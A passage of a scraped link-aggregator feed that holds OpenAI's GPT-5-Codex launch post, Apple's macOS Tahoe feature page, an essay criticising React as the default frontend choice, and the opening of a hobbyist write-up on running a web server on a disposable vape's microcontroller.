    &lt;p&gt;Today, we’re releasing GPT‑5-Codex—a version of GPT‑5 further optimized for agentic coding in Codex. GPT‑5-Codex was trained with a focus on real-world software engineering work; it’s equally proficient at quick, interactive sessions and at independently powering through long, complex tasks. Its code review capability can catch critical bugs before they ship. GPT‑5-Codex is available everywhere you use Codex—it’s the default for cloud tasks and code review, and developers can choose to use it for local tasks via Codex CLI and the IDE extension.&lt;/p&gt;
    &lt;p&gt;Since we first launched Codex CLI(opens in a new window) in April and Codex web in May, Codex has steadily evolved into a more effective coding collaborator. Two weeks ago, we unified Codex into a single product experience connected by your ChatGPT account, enabling you to move work seamlessly between your local environment and the cloud without losing context. Codex now works where you develop—in your terminal or IDE, on the web, in GitHub, and even in the ChatGPT iOS app. Codex is included with ChatGPT Plus, Pro, Business, Edu, and Enterprise plans.&lt;/p&gt;
    &lt;p&gt;With these updates, Codex moves closer to what we’ve been building toward all along—a teammate that understands your context, works alongside you, and reliably takes on work for your team.&lt;/p&gt;
    &lt;p&gt;GPT‑5-Codex is a version of GPT‑5 further optimized for agentic software engineering in Codex. It’s trained on complex, real-world engineering tasks such as building full projects from scratch, adding features and tests, debugging, performing large-scale refactors, and conducting code reviews. It’s more steerable, adheres better to AGENTS.md(opens in a new window) instructions, and produces higher-quality code—just tell it what you need without writing long instructions on style or code cleanliness.&lt;/p&gt;
    &lt;p&gt;GPT‑5-Codex adapts how much time it spends thinking more dynamically based on the complexity of the task. The model combines two essential skills for a coding agent: pairing with developers in interactive sessions, and persistent, independent execution on longer tasks. That means Codex will feel snappier on small, well-defined requests or while you are chatting with it, and will work for longer on complex tasks like big refactors. During testing, we've seen GPT‑5-Codex work independently for more than 7 hours at a time on large, complex tasks, iterating on its implementation, fixing test failures, and ultimately delivering a successful implementation.&lt;/p&gt;
    &lt;p&gt;On OpenAI employee traffic, we see that for the bottom 10% of user turns sorted by model-generated tokens (including hidden reasoning and final output), GPT‑5-Codex uses 93.7% fewer tokens than GPT‑5. Conversely, for the top 10%, GPT‑5-Codex thinks more, spending twice as long reasoning, editing and testing code, and iterating.&lt;/p&gt;
    &lt;p&gt;GPT‑5-Codex has been trained specifically for conducting code reviews and finding critical flaws. When reviewing, it navigates your codebase, reasons through dependencies, and runs your code and tests in order to validate correctness. We evaluated code review performance on recent commits from popular open-source repositories. For each commit, experienced software engineers evaluated review comments for correctness and importance. We find that comments by GPT‑5-Codex are less likely to be incorrect or unimportant, reserving more user attention for critical issues.&lt;/p&gt;
    &lt;p&gt;GPT‑5-Codex is a reliable partner on front-end tasks. In addition to creating aesthetic desktop apps, GPT‑5-Codex also shows significant improvements in human preference evaluations when creating mobile websites. When working in the cloud, it can look at images or screenshots you provide as input, visually inspect its progress, and display screenshots of its work to you.&lt;/p&gt;
    &lt;p&gt;GPT‑5-Codex was purpose-built for Codex CLI, the Codex IDE extension, the Codex cloud environment, and working in GitHub, and also supports versatile tool use. Unlike GPT‑5, which is a general-purpose model, we recommend using GPT‑5-Codex only for agentic coding tasks in Codex or Codex-like environments.&lt;/p&gt;
    &lt;p&gt;We also recently made some updates to make Codex a better pair programmer, with a revamped Codex CLI and the new Codex IDE extension.&lt;/p&gt;
    &lt;p&gt;Codex CLI is open-source, and community feedback over the last few months has been invaluable in shaping its evolution. With this feedback, we’ve rebuilt Codex CLI around agentic coding workflows to harness our models into more capable and reliable partners. You can now attach and share images—screenshots, wireframes, and diagrams—right in the CLI to build shared context on design decisions and get exactly what you want. When doing more complex work, Codex now tracks progress with a to-do list, and includes tools like web search and MCP for connecting to external systems, with more accurate tool use overall.&lt;/p&gt;
    &lt;p&gt;The terminal UI has also been upgraded: tool calls and diffs are better formatted and easier to follow. Approval modes are simplified to three levels: read-only with explicit approvals, auto with full workspace access but requiring approvals outside the workspace, and full access with the ability to read files anywhere and run commands with network access. It also supports compacting conversation state to make longer sessions easier to manage.&lt;/p&gt;
    &lt;p&gt;Check out the Codex CLI quickstart(opens in a new window) to learn more.&lt;/p&gt;
    &lt;p&gt;Codex meets you where you already work, including in your IDE. The IDE extension brings the Codex agent into VS Code, Cursor, and other VS Code forks, so that you can seamlessly preview local changes and edit code with Codex. When you use Codex in your IDE, you can write shorter prompts and get faster results because Codex can use context like the files you’ve opened or the code you’ve selected.&lt;/p&gt;
    &lt;p&gt;The Codex IDE extension also lets you move work smoothly between the cloud and your local environment. You can create new cloud tasks, track in‑progress work, and review completed tasks without leaving your editor. To make finishing touches, you can open cloud tasks in your IDE, and Codex maintains context. Learn more on how to get the most out of the IDE extension in the quickstart(opens in a new window).&lt;/p&gt;
    &lt;p&gt;In addition to Codex CLI, the new IDE extension and GitHub integration bring the Codex cloud agent closer to developer workflows so you can now delegate tasks without switching away from your editor or GitHub.&lt;/p&gt;
    &lt;p&gt;Behind the scenes, we’ve also been continuously improving cloud infrastructure performance. By caching containers, we’ve slashed the median completion time for new tasks and follow-ups by 90%. Codex also now automatically sets up its own environment by scanning for common setup scripts and executing them, and with configurable internet access can run commands like pip install to fetch dependencies as needed at runtime.&lt;/p&gt;
    &lt;p&gt;Like in the CLI and IDE extension, you can now use images to share frontend design specs or explain UI bugs. As it builds for you, Codex can spin up its own browser, look at what it built, iterate, and attach a screenshot of the result to the task and GitHub PR. For more details, check out the docs(opens in a new window).&lt;/p&gt;
    &lt;p&gt;Codex also now includes code review capabilities trained to catch critical flaws. Unlike static analysis tools, it matches the stated intent of a PR to the actual diff, reasons over the entire codebase and dependencies, and executes code and tests to validate behavior. Only the most thorough human reviewers put this level of effort into every PR they review, so Codex fills the gap—helping teams find problems earlier, reduce reviewer load, and ship with more confidence.&lt;/p&gt;
    &lt;p&gt;Once turned on for a GitHub repo, Codex automatically reviews PRs as they move from draft to ready, posting its analysis on the PR. If it recommends edits, you can stay in the same thread and ask Codex to implement them. You can also explicitly ask for a review by mentioning “@codex review” in a PR, and give it extra guidance like “@codex review for security vulnerabilities” or “@codex review for outdated dependencies”. Check out the quickstart(opens in a new window) to learn how to set up code review for your repos.&lt;/p&gt;
    &lt;p&gt;At OpenAI, Codex now reviews the vast majority of our PRs, catching hundreds of issues every day—often before a human review begins. It’s been key to letting the Codex team move fast with greater confidence.&lt;/p&gt;
    &lt;head rend="h3"&gt;How developers are using Codex&lt;/head&gt;
    &lt;quote&gt;“I needed to update a codebase owned by another team for a feature release. [...] With Codex, I offloaded the refactoring and test generation while focusing on other priorities. It produced high-quality, fully tested code that I could quickly hand back — keeping the feature on schedule without adding risk.”&lt;/quote&gt;
    &lt;p&gt;We’re building Codex with a focus on protecting code and data from exfiltration, and guarding against misuse. By default, Codex runs in a sandboxed environment with network access(opens in a new window) disabled, whether locally or in the cloud. This helps ensure Codex can’t take harmful actions on your computer, and reduces the risk of prompt injections from untrusted sources.&lt;/p&gt;
    &lt;p&gt;Codex can ask for permission before potentially dangerous actions and is trained to run commands to verify its outputs. Developers can customize security settings to match their risk tolerance. In the cloud, you can limit network access to trusted domains. In the CLI and IDE extension, developers can approve commands to run with full access or allow the agent to use web search and connect to MCP servers. This can expand capabilities of the agent while increasing the risks–learn more about how to securely operate and manage Codex here(opens in a new window).&lt;/p&gt;
    &lt;p&gt;We always encourage developers to review the agent’s work before making changes or deploying to production. Codex provides citations, terminal logs, and test results with each task to help with this. While Codex code reviews help reduce the risk of dangerous issues being deployed to production, whether created by humans or agents, we always recommend using Codex as an additional reviewer—not a replacement for human reviews.&lt;/p&gt;
    &lt;p&gt;Consistent with our approach to GPT‑5, we have decided to treat GPT‑5-Codex as High capability in the Biological and Chemical domains, and have implemented safeguards to minimize the associated risks. Read more about our assessments and robust safety approach in the system card addendum.&lt;/p&gt;
    &lt;p&gt;Codex is included with ChatGPT Plus, Pro, Business, Edu, and Enterprise plans. Usage scales with your plan: Plus, Edu and Business seats can cover a few focused coding sessions each week, while Pro can support a full workweek across multiple projects.&lt;/p&gt;
    &lt;p&gt;Business plans can purchase credits to enable developers to go beyond their included limits, while Enterprise plans provide a shared credit pool so you only pay for what your developers use. Learn more about usage limits in ChatGPT here(opens in a new window).&lt;/p&gt;
    &lt;p&gt;For developers using Codex CLI via API key, we plan to make GPT‑5-Codex available in the API soon.&lt;/p&gt;
    &lt;p&gt;Codex is becoming the coding partner we’ve always envisioned—one that’s faster, more reliable, and deeply integrated into the tools you already use. We’re excited to see what you build with it and will keep improving Codex to make it an even better teammate for your most ambitious projects.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://openai.com/index/introducing-upgrades-to-codex/"/><published>2025-09-15T17:10:39+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45252378</id><title>macOS Tahoe</title><updated>2025-09-16T13:01:47.978542+00:00</updated><content>&lt;doc fingerprint="a4b4eb2d8b62abe1"&gt;
  &lt;main&gt;
    &lt;p&gt;A new design with Liquid Glass. Beautiful, delightful, and instantly familiar.&lt;/p&gt;
    &lt;p&gt;Now with the Phone app1 and Live Activities2 from iPhone for next‑level Continuity.&lt;/p&gt;
    &lt;p&gt;Take hundreds of actions in Spotlight without lifting your hands off the keyboard.&lt;/p&gt;
    &lt;p&gt;Create more powerful shortcuts than ever with Apple Intelligence.3&lt;/p&gt;
    &lt;p&gt;Design&lt;/p&gt;
    &lt;p&gt;More you. Shines through.&lt;/p&gt;
    &lt;p&gt;Reimagined with Liquid Glass, macOS Tahoe is at once fresh and familiar. Apps bring more focus to your content. You can personalize your Mac like never before. And everything just flows into place.&lt;/p&gt;
    &lt;p&gt;Delightful new design.&lt;/p&gt;
    &lt;p&gt;Liquid Glass refracts and reflects content in real time, bringing even more clarity to navigation and controls — and even more vitality to everything you do.&lt;/p&gt;
    &lt;p&gt;Updated app icons.&lt;/p&gt;
    &lt;p&gt;Personalize your Mac with new options including updated light or dark appearances, new color-tinted icons, or a stunning clear look.&lt;/p&gt;
    &lt;p&gt;Personalized controls and menu bar.&lt;/p&gt;
    &lt;p&gt;Your display feels even larger with the transparent menu bar. And you have more ways to customize the controls and layout in the menu bar and Control Center, even those from third parties.&lt;/p&gt;
    &lt;p&gt;Refreshed apps.&lt;/p&gt;
    &lt;p&gt;Sidebars and toolbars in apps reflect the depth of your workspace and offer a subtle hint of the content within reach as you scroll.&lt;/p&gt;
    &lt;p&gt;Apple Intelligence&lt;/p&gt;
    &lt;p&gt;Get more done, from even more places.&lt;/p&gt;
    &lt;p&gt;Now integrated into even more apps and experiences, Apple Intelligence helps you get things done effortlessly and communicate across languages.3&lt;/p&gt;
    &lt;p&gt;Live Translation.&lt;/p&gt;
    &lt;p&gt;Automatically translate texts in Messages,4 display live translated captions in FaceTime, and get spoken translations for calls in the Phone app.5&lt;/p&gt;
    &lt;p&gt;Accelerate your workflows.&lt;/p&gt;
    &lt;p&gt;Intelligent actions in Shortcuts can summarize text, create images, or tap directly into Apple Intelligence models to provide responses that feed into your shortcut.&lt;/p&gt;
    &lt;p&gt;More ways to express yourself with images.&lt;/p&gt;
    &lt;p&gt;Mix emoji and descriptions to make something brand-new. In Image Playground, discover additional ChatGPT styles. And have even more control when making images inspired by family and friends using Genmoji and Image Playground.6&lt;/p&gt;
    &lt;p&gt;Continuity&lt;/p&gt;
    &lt;p&gt;Together they’re better than ever.&lt;/p&gt;
    &lt;p&gt;Continuity helps you work seamlessly across Apple devices. And with the Phone app and Live Activities coming to Mac, it’s even easier to stay on top of things happening in real time.&lt;/p&gt;
    &lt;p&gt;Live Activities on Mac.&lt;/p&gt;
    &lt;p&gt;The menu bar now features the Live Activities from your iPhone. And when you click one, the app opens in iPhone Mirroring so you can take action.2&lt;/p&gt;
    &lt;p&gt;New Phone app for Mac.&lt;/p&gt;
    &lt;p&gt;Make and take calls with a click. Conveniently access your synced content like Recents, Contacts, and Voicemail — and enjoy the familiar features from iPhone.1&lt;/p&gt;
    &lt;p&gt;Manage unwanted calls.&lt;/p&gt;
    &lt;p&gt;For unknown numbers, Call Screening finds out who’s calling and why. Once the caller shares their name and the reason for their call, your phone rings and you can decide if you want to pick up.7&lt;/p&gt;
    &lt;p&gt;Stay productive while on hold.&lt;/p&gt;
    &lt;p&gt;Hold Assist keeps your spot in line while you wait for a live agent and notifies you when they’re ready.8&lt;/p&gt;
    &lt;p&gt;Productivity&lt;/p&gt;
    &lt;p&gt;Calm in the brainstorm.&lt;/p&gt;
    &lt;p&gt;Make quick work of everyday tasks, jump into your favorite activities, and turbocharge pro workflows — all with a whole lot less effort.&lt;/p&gt;
    &lt;p&gt;Biggest Spotlight update ever.&lt;/p&gt;
    &lt;p&gt;Spotlight lets you take hundreds of actions without lifting your hands off the keyboard. And new quick keys help you perform actions even faster.&lt;/p&gt;
    &lt;p&gt;A faster way to browse.&lt;/p&gt;
    &lt;p&gt;You can now keep all your apps and most accessed files within easy reach, including intelligent suggestions based on your routines.&lt;/p&gt;
    &lt;p&gt;Smart, effortless automation.&lt;/p&gt;
    &lt;p&gt;Now you can run shortcuts automatically — at a specific time of day or when you take specific actions, like saving a file to a particular folder or connecting to a display.&lt;/p&gt;
    &lt;p&gt;Magnifier lets you zoom in on your surroundings using a connected camera. Accessibility Reader provides a systemwide, customized reading and listening experience. Braille Access creates an all-new interface for braille displays.9 And Vehicle Motion Cues help reduce motion sickness in moving vehicles.&lt;/p&gt;
    &lt;p&gt;Family.&lt;/p&gt;
    &lt;p&gt;Parents can take advantage of a wide set of parental controls designed to keep children safe. These include new enhancements across Communication Limits, Communication Safety, and the App Store.&lt;/p&gt;
    &lt;p&gt;Journal.&lt;/p&gt;
    &lt;p&gt;Now on Mac for the most comfortable writing experience, Journal makes it easy to capture and write about everyday moments and special events using photos, videos, audio recordings, places, and more.&lt;/p&gt;
    &lt;p&gt;Photos.&lt;/p&gt;
    &lt;p&gt;An updated design lets you quickly access filtering and sorting options and customize the size of Collections tiles so you can view your library just how you like. And with Pinned Collections, you can keep your most-visited ones right at your fingertips.&lt;/p&gt;
    &lt;p&gt;FaceTime.&lt;/p&gt;
    &lt;p&gt;Celebrate the people who matter most with a new tiled design that features beautiful and personalized Contact Posters.&lt;/p&gt;
    &lt;p&gt;Reminders.&lt;/p&gt;
    &lt;p&gt;With Apple Intelligence, Reminders can suggest tasks, grocery items, and follow-ups based on emails or other text on your device. It can also automatically categorize related reminders into sections within a list.&lt;/p&gt;
    &lt;p&gt;Games.&lt;/p&gt;
    &lt;p&gt;The new Games app brings together all the games you have on your Mac. In the Game Overlay, you can adjust system settings, chat with friends, or invite them to play — all without leaving the game. And for developers, Metal 4 brings even more advanced graphics and rendering technologies, like MetalFX Frame Interpolation and Denoising.&lt;/p&gt;
    &lt;p&gt;Messages.&lt;/p&gt;
    &lt;p&gt;Create polls and personalize conversations with backgrounds. Redesigned conversation details feature designated sections for contact info, photos, links, location, and more. Typing indicators in groups let you know exactly who is about to chime in. Screening tools detect spam and give you control. And the Add Contact button now appears next to an unknown number in a group.&lt;/p&gt;
    &lt;p&gt;Passwords.&lt;/p&gt;
    &lt;p&gt;Easily refer to changes you’ve made to your accounts. Find previous versions of passwords, along with when they were changed.&lt;/p&gt;
    &lt;p&gt;Notes.&lt;/p&gt;
    &lt;p&gt;Capture conversations in the Phone app as audio recordings with transcriptions.10 You can also export a note into a Markdown file.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.apple.com/os/macos/"/><published>2025-09-15T17:16:42+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45252715</id><title>React is winning by default and slowing innovation</title><updated>2025-09-16T13:01:47.368817+00:00</updated><content>&lt;doc fingerprint="b7e9953b6b12f9da"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;React Won by Default – And It's Killing Frontend Innovation&lt;/head&gt;
    &lt;p&gt;React-by-default has hidden costs. Here's a case for making deliberate choices to select the right framework for the job.&lt;/p&gt;
    &lt;head rend="h1"&gt;React Won by Default – And It’s Killing Frontend Innovation&lt;/head&gt;
    &lt;p&gt;React is no longer winning by technical merit. Today it is winning by default. That default is now slowing innovation across the frontend ecosystem.&lt;/p&gt;
    &lt;p&gt;When teams need a new frontend, the conversation rarely starts with “What are the constraints and which tool best fits them?” It often starts with “Let’s use React; everyone knows React.” That reflex creates a self-perpetuating cycle where network effects, rather than technical fit, decide architecture.&lt;/p&gt;
    &lt;p&gt;Meanwhile, frameworks with real innovations struggle for adoption. Svelte compiles away framework overhead. Solid delivers fine-grained reactivity without virtual-DOM tax. Qwik achieves instant startup via resumability. These approaches can outperform React’s model in common scenarios, but they rarely get a fair evaluation because React is chosen by default.&lt;/p&gt;
    &lt;p&gt;React is excellent at many things. The problem isn’t React itself, it’s the React-by-default mindset.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Innovation Ceiling&lt;/head&gt;
    &lt;p&gt;React’s technical foundations explain some of today’s friction. The virtual DOM was a clever solution for 2013’s problems, but as Rich Harris outlined in “Virtual DOM is pure overhead”, it introduces work modern compilers can often avoid.&lt;/p&gt;
    &lt;p&gt;Hooks addressed class component pain but introduced new kinds of complexity: dependency arrays, stale closures, and misused effects. Even React’s own docs emphasize restraint: “You Might Not Need an Effect”. Server Components improve time-to-first-byte, but add architectural complexity and new failure modes.&lt;/p&gt;
    &lt;p&gt;The React Compiler is a smart solution that automates patterns like &lt;code&gt;useMemo&lt;/code&gt;/&lt;code&gt;useCallback&lt;/code&gt;. Its existence is also a signal: we’re optimizing around constraints baked into the model.&lt;/p&gt;
    &lt;p&gt;Contrast this with alternative approaches: Svelte 5’s Runes simplify reactivity at compile time; Solid’s fine-grained reactivity updates exactly what changed; Qwik’s resumability eliminates traditional hydration. These aren’t incremental tweaks to React’s model—they’re different models with different ceilings.&lt;/p&gt;
    &lt;p&gt;Innovation without adoption doesn’t change outcomes. Adoption can’t happen when the choice is made by reflex.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Technical Debt We’re All Carrying&lt;/head&gt;
    &lt;p&gt;Defaulting to React often ships a runtime and reconciliation cost we no longer question. Even when it’s fast enough, the ceiling is lower than compile-time or fine-grained models. Developer time is spent managing re-renders, effect dependencies, and hydration boundaries instead of shipping value. The broader lesson from performance research is consistent: JavaScript is expensive on the critical path (The Cost of JavaScript).&lt;/p&gt;
    &lt;p&gt;We’ve centered mental models around “React patterns” instead of web fundamentals, reducing portability of skills and making architectural inertia more likely.&lt;/p&gt;
    &lt;p&gt;The loss isn’t just performance, it’s opportunity cost when better-fit alternatives are never evaluated. For instance, benchmarks like the JS Framework Benchmark show alternatives like Solid achieving up to 2-3x faster updates in reactivity-heavy scenarios compared to React.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Frameworks Being Suffocated&lt;/head&gt;
    &lt;head rend="h3"&gt;Svelte: The Compiler Revolution&lt;/head&gt;
    &lt;p&gt;Svelte shifts work to compile time: no virtual DOM, minimal runtime. Components become targeted DOM operations. The mental model aligns with web fundamentals.&lt;/p&gt;
    &lt;p&gt;But “not enough jobs” keeps Svelte adoption artificially low despite its technical superiority for most use cases. Real-world examples, like The Guardian’s adoption of Svelte for their frontend, demonstrate measurable gains in performance and developer productivity, with reported reductions in bundle sizes and faster load times. For instance, as detailed in Wired’s article on Svelte, developer Shawn Wang (@swyx on X/Twitter) reduced his site’s size from 187KB in React to just 9KB in Svelte by leveraging its compile-time optimizations, which shift framework overhead away from runtime. This leads to faster, more efficient apps especially on slow connections.&lt;/p&gt;
    &lt;head rend="h3"&gt;Solid: The Reactive Primitive Approach&lt;/head&gt;
    &lt;p&gt;Solid delivers fine-grained reactivity with JSX familiarity. Updates flow through signals directly to affected DOM nodes, bypassing reconciliation bottlenecks. Strong performance characteristics, limited mindshare. As outlined in Solid’s comparison guide, this approach enables more efficient updates than React’s virtual DOM, with precise reactivity that minimizes unnecessary work and improves developer experience through simpler state management.&lt;/p&gt;
    &lt;p&gt;While prominent case studies are scarcer than for more established frameworks, this is largely due to Solid’s lower adoption. Yet anecdotal reports from early adopters suggest similar transformative gains in update efficiency and code simplicity, waiting to be scaled and shared as more teams experiment.&lt;/p&gt;
    &lt;head rend="h3"&gt;Qwik: The Resumability Innovation&lt;/head&gt;
    &lt;p&gt;Qwik uses resumability instead of hydration, enabling instant startup by loading only what the current interaction needs. Ideal for large sites, long sessions, or slow networks. According to Qwik’s Think Qwik guide, this is achieved through progressive loading and serializing both state and code. Apps can thus resume execution instantly without heavy client-side bootstrapping, resulting in superior scalability and reduced initial load times compared to traditional frameworks.&lt;/p&gt;
    &lt;p&gt;Success stories for Qwik may be less visible simply because fewer teams have broken from defaults to try it. But those who have report dramatic improvements in startup times and resource efficiency, indicating a wealth of untapped potential if adoption grows.&lt;/p&gt;
    &lt;p&gt;All three under-adopted not for lack of merit, but because the default choice blocks trying them out.&lt;/p&gt;
    &lt;p&gt;Furthermore, React’s API surface area is notably larger and more complex than its alternatives, encompassing concepts like hooks, context, reducers, and memoization patterns that require careful management to avoid pitfalls. This expansive API contributes to higher cognitive load for developers, often leading to bugs from misunderstood dependencies or over-engineering. For example, in Cloudflare’s September 12, 2025 outage, a useEffect hook with a problematic dependency array triggered repeated API calls, overwhelming their Tenant Service and causing widespread failures. In contrast, frameworks like Svelte, Solid, and Qwik feature smaller, more focused APIs that emphasize simplicity and web fundamentals, reducing the mental overhead and making them easier to master and maintain.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Network Effect Prison&lt;/head&gt;
    &lt;p&gt;React’s dominance creates self-reinforcing barriers. Job postings ask for “React developers” rather than “frontend engineers,” limiting skill diversity. Component libraries and team muscle memory create institutional inertia.&lt;/p&gt;
    &lt;p&gt;Risk-averse leaders choose the “safe” option. Schools teach what jobs ask for. The cycle continues independent of technical merit.&lt;/p&gt;
    &lt;p&gt;That’s not healthy competition; it’s ecosystem capture by default.&lt;/p&gt;
    &lt;head rend="h2"&gt;Breaking the Network Effect&lt;/head&gt;
    &lt;p&gt;Escaping requires deliberate action at multiple levels. Technical leaders should choose based on constraints and merits, not momentum. Companies can allocate a small innovation budget to trying alternatives. Developers can upskill beyond a single mental model.&lt;/p&gt;
    &lt;p&gt;Educators can teach framework-agnostic concepts alongside specific tools. Open source contributors can help alternative ecosystems mature.&lt;/p&gt;
    &lt;p&gt;Change won’t happen automatically. It requires conscious choice.&lt;/p&gt;
    &lt;head rend="h2"&gt;Framework Evaluation Checklist&lt;/head&gt;
    &lt;p&gt;To make deliberate choices, use this simple checklist when starting a new project:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Assess Performance Needs: Evaluate metrics like startup time, update efficiency, and bundle size. Prioritize frameworks with compile-time optimizations if speed is critical.&lt;/item&gt;
      &lt;item&gt;Team Skills and Learning Curve: Consider existing expertise but factor in migration paths; many alternatives offer gentle ramps (e.g., Solid’s JSX compatibility with React).&lt;/item&gt;
      &lt;item&gt;Scaling and Cost of Ownership: Calculate long-term costs, including maintenance, dependency management, and tech debt. Alternatives often reduce runtime overhead, lowering hosting costs and improving scalability.&lt;/item&gt;
      &lt;item&gt;Ecosystem Fit: Balance maturity with innovation; pilot in non-critical areas to test migration feasibility and ROI.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;The Standard Counter‑Arguments&lt;/head&gt;
    &lt;p&gt;“But ecosystem maturity!” Maturity is valuable, and can also entrench inertia. Age isn’t the same as fitness for today’s constraints.&lt;/p&gt;
    &lt;p&gt;Additionally, a mature ecosystem often means heavy reliance on third-party packages, which can introduce maintenance burdens like keeping dependencies up-to-date, dealing with security vulnerabilities, and bloating bundles with unused code. While essential in some cases, this flexibility can lead to over-dependence; custom solutions tailored to specific needs are often leaner and more maintainable in the long run. Smaller ecosystems in alternative frameworks encourage building from fundamentals, fostering deeper understanding and less technical debt. Moreover, with AI coding assistants now able to generate precise, custom functions on demand, the barrier to creating bespoke utilities has lowered dramatically. This makes it feasible to avoid generic libraries like lodash or date libraries like Moment or date-fns entirely in favor of lightweight, app-specific implementations.&lt;/p&gt;
    &lt;p&gt;“But hiring!” Hiring follows demand. You can de‑risk by piloting alternatives in non‑critical paths, then hiring for fundamentals plus on‑the‑job training.&lt;/p&gt;
    &lt;p&gt;“But component libraries!” Framework‑agnostic design systems and Web Components reduce lock-in while preserving velocity.&lt;/p&gt;
    &lt;p&gt;“But stability!” React’s evolution from classes to hooks to Server Components demonstrates constant churn, not stability. Alternative frameworks often provide more consistent APIs.&lt;/p&gt;
    &lt;p&gt;“But proven at scale!” jQuery was proven at scale too. Past success doesn’t guarantee future relevance.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Broader Ecosystem Harm&lt;/head&gt;
    &lt;p&gt;Monoculture slows web evolution when one framework’s constraints become de facto limits. Talent spends cycles solving framework-specific issues rather than pushing the platform forward. Investment follows incumbents regardless of technical merit.&lt;/p&gt;
    &lt;p&gt;Curricula optimize for immediate employability over fundamentals, creating framework-specific rather than transferable skills. Platform improvements get delayed because “React can handle it” becomes a default answer.&lt;/p&gt;
    &lt;p&gt;The entire ecosystem suffers when diversity disappears.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Garden We Could Grow&lt;/head&gt;
    &lt;p&gt;Healthy ecosystems require diversity, not monocultures. Innovation emerges when different approaches compete and cross-pollinate. Developers grow by learning multiple mental models. The platform improves when several frameworks push different boundaries.&lt;/p&gt;
    &lt;p&gt;Betting everything on one model creates a single point of failure. What happens if it hits hard limits? What opportunities are we missing by not exploring alternatives?&lt;/p&gt;
    &lt;p&gt;It’s time to choose frameworks based on constraints and merit rather than momentum. Your next project deserves better than React-by-default. The ecosystem deserves the innovation only diversity can provide.&lt;/p&gt;
    &lt;p&gt;Stop planting the same seed by default. The garden we could cultivate through diverse framework exploration would be more resilient and more innovative than the monoculture we’ve drifted into.&lt;/p&gt;
    &lt;p&gt;The choice is ours to make.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.lorenstew.art/blog/react-won-by-default/"/><published>2025-09-15T17:46:01+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45252817</id><title>Hosting a website on a disposable vape</title><updated>2025-09-16T13:01:47.243731+00:00</updated><content>&lt;doc fingerprint="26b5c1054b922ae9"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Hosting a WebSite on a Disposable Vape&lt;/head&gt;
    &lt;head rend="h1"&gt;Preface#&lt;/head&gt;
    &lt;p&gt;This article is NOT served from a web server running on a disposable vape. If you want to see the real deal, click here. The content is otherwise identical.&lt;/p&gt;
    &lt;head rend="h1"&gt;Background#&lt;/head&gt;
    &lt;p&gt;For a couple of years now, I have been collecting disposable vapes from friends and family. Initially, I only salvaged the batteries for “future” projects (It’s not hoarding, I promise), but recently, disposable vapes have gotten more advanced. I wouldn’t want to be the lawyer who one day will have to argue how a device with USB C and a rechargeable battery can be classified as “disposable”. Thankfully, I don’t plan on pursuing law anytime soon.&lt;/p&gt;
    &lt;p&gt;Last year, I was tearing apart some of these fancier pacifiers for adults when I noticed something that caught my eye, instead of the expected black blob of goo hiding some ASIC (Application Specific Integrated Circuit) I see a little integrated circuit inscribed “PUYA”. I don’t blame you if this name doesn’t excite you as much it does me, most people have never heard of them. They are most well known for their flash chips, but I first came across them after reading Jay Carlson’s blog post about the cheapest flash microcontroller you can buy. They are quite capable little ARM Cortex-M0+ micros.&lt;/p&gt;
    &lt;p&gt;Over the past year I have collected quite a few of these PY32 based vapes, all of them from different models of vape from the same manufacturer. It’s not my place to do free advertising for big tobacco, so I won’t mention the brand I got it from, but if anyone who worked on designing them reads this, thanks for labeling the debug pins!&lt;/p&gt;
    &lt;head rend="h1"&gt;What are we working with#&lt;/head&gt;
    &lt;p&gt;The chip is marked &lt;code&gt;PUYA C642F15&lt;/code&gt;, which wasn’t very helpful. I was pretty sure it was a &lt;code&gt;PY32F002A&lt;/code&gt;, but after poking around with pyOCD, I noticed that the flash was 24k and we have 3k of RAM. The extra flash meant that it was more likely a &lt;code&gt;PY32F002B&lt;/code&gt;, which is actually a very different chip.1&lt;/p&gt;
    &lt;p&gt;So here are the specs of a microcontroller so bad, it’s basically disposable:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;24MHz Coretex M0+&lt;/item&gt;
      &lt;item&gt;24KiB of Flash Storage&lt;/item&gt;
      &lt;item&gt;3KiB of Static RAM&lt;/item&gt;
      &lt;item&gt;a few peripherals, none of which we will use.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;You may look at those specs and think that it’s not much to work with. I don’t blame you, a 10y old phone can barely load google, and this is about 100x slower. I on the other hand see a blazingly fast web server.&lt;/p&gt;
    &lt;head rend="h1"&gt;Getting online#&lt;/head&gt;
    &lt;p&gt;The idea of hosting a web server on a vape didn’t come to me instantly. In fact, I have been playing around with them for a while, but after writing my post on semihosting, the penny dropped.&lt;/p&gt;
    &lt;p&gt;If you don’t feel like reading that article, semihosting is basically syscalls for embedded ARM microcontrollers. You throw some values/pointers into some registers and call a breakpoint instruction. An attached debugger interprets the values in the registers and performs certain actions. Most people just use this to get some logs printed from the microcontroller, but they are actually bi-directional.&lt;/p&gt;
    &lt;p&gt;If you are older than me, you might remember a time before Wi-Fi and Ethernet, the dark ages, when you had to use dial-up modems to get online. You might also know that the ghosts of those modems still linger all around us. Almost all USB serial devices actually emulate those modems: a 56k modem is just 57600 baud serial device. Data between some of these modems was transmitted using a protocol called SLIP (Serial Line Internet Protocol).2&lt;/p&gt;
    &lt;p&gt;This may not come as a surprise, but Linux (and with some tweaking even macOS) supports SLIP. The &lt;code&gt;slattach&lt;/code&gt; utility can make any &lt;code&gt;/dev/tty*&lt;/code&gt; send and receive IP packets. All we have to do is put the data down the wire in the right format and provide a virtual tty.
